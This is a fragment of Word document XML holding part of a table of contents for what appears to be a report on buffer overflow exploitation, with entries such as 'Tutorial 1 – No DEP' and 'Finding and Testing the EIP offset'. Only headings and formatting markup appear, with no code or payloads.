                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="030DE1DE" w14:textId="56444AB3" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326450" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>1.1.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attack Fundamentals</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326450 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="469EB9B2" w14:textId="2E210BD9" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326451" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>1.1.4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>The Application</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326451 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5246B669" w14:textId="14B70BBC" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326452" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Aims and Objectives</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326452 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7DD0B554" w14:textId="583B5F84" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326453" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure and Results</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326453 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4AC959E4" w14:textId="73150561" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326454" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Overview of Procedure</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326454 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="298A5BC4" w14:textId="5798D26B" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326455" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools and Languages</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326455 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3BEF432C" w14:textId="003112BF" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326456" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Hardware Specifications</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326456 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="64F0C812" w14:textId="66870D8F" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326457" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Methodology</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326457 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0438599F" w14:textId="3703AB87" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326458" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tutorial 1 – No DEP</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326458 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="00D2DEA4" w14:textId="0D719BF4" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326459" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Fuzzing and Replicating the Crash</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326459 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="34B3DDB2" w14:textId="0A4C5B0C" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326460" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Finding and Testing the EIP offset</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326460 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="734CBE45" w14:textId="7431A8B3" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326461" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>2.5.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
